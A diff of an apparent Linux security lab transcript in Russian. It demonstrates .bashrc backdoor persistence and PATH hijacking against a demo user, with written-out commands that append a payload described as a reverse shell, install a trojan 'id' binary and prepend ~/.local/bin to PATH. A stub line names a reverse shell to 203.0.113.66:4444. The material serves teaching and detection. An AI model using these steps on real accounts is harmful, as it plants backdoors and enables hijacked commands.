@@ -1,41 +1,18 @@
-===== Системные файлы окружения =====
+===== Атакующий =====
 
-# cat /etc/environment
-PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"
-# grep -n pam_env /etc/pam.d/login
-51:session       required   pam_env.so readenv=1
-54:session       required   pam_env.so readenv=1 envfile=/etc/default/locale
-# grep -nE 'profile.d' /etc/profile
-20:if [ -d /etc/profile.d ]; then
-21:  for i in $(run-parts --list --regex '…\.sh$' /etc/profile.d); do
+# echo "$payload" >> /home/ossec-demo1/.bashrc   # мнимый reverse shell (bash /dev/tcp)
+# install -m 0755 trojan-id /home/ossec-demo1/.local/bin/id
+# echo 'export PATH=$HOME/.local/bin:$PATH' >> /home/ossec-demo1/.bashrc
+# tail -n 3 /home/ossec-demo1/.bashrc
+echo "[.bashrc] выполнен"
+echo "[backdoor] reverse shell -> 203.0.113.66:4444 (демо-заглушка, без сети)"
+export PATH="$HOME/.local/bin:$PATH"
 
-===== Кто какой файл читает =====
+===== Жертва =====
 
-$ runuser -u ossec-demo1 -- bash -l -c id   # login-оболочка
-[profile.d] выполнен (во всех login-сеансах)
-[.profile] выполнен (login-оболочка пользователя)
-ossec-demo1
-$ runuser -u ossec-demo1 -- bash -i -c id   # интерактивная не-login оболочка
-[.bashrc] выполнен (любая интерактивная оболочка)
-ossec-demo1
-
-===== Подмена ~/.bashrc: выполнение кода =====
-
-# echo 'touch /tmp/ossec-backdoor-marker' >> /home/ossec-demo1/.bashrc
-# tail -n 1 /home/ossec-demo1/.bashrc
-touch /tmp/ossec-backdoor-marker
-$ runuser -u ossec-demo1 -- bash -i -c true   # жертва запускает оболочку
-[.bashrc] выполнен (любая интерактивная оболочка)
-# ls -l /tmp/ossec-backdoor-marker
--rw------- 1 ossec-demo1 ossec-demo1 0 Oct 29 06:17 /tmp/ossec-backdoor-marker
-
-===== Подмена ~/.bashrc: перехват PATH =====
-
-# install -d -m 0755 /home/ossec-demo1/.local/bin
-# cat > /home/ossec-demo1/.local/bin/id   # троянская подмена: баннер, затем настоящий id
-# echo 'export PATH="$HOME/.local/bin:$PATH"' >> /home/ossec-demo1/.bashrc
-$ runuser -u ossec-demo1 -- bash -i -c 'command -v id; id -un'
-[.bashrc] выполнен (любая интерактивная оболочка)
+$ bash -i -c 'command -v id; id -un'   # обычный сеанс жертвы
+[.bashrc] выполнен
+[backdoor] reverse shell -> 203.0.113.66:4444 (демо-заглушка, без сети)
 /home/ossec-demo1/.local/bin/id
-[trojan id] перехвачен вызов; дальше можно подделать вывод
+[trojan id] вызов перехвачен; вывод можно подделать
 ossec-demo1
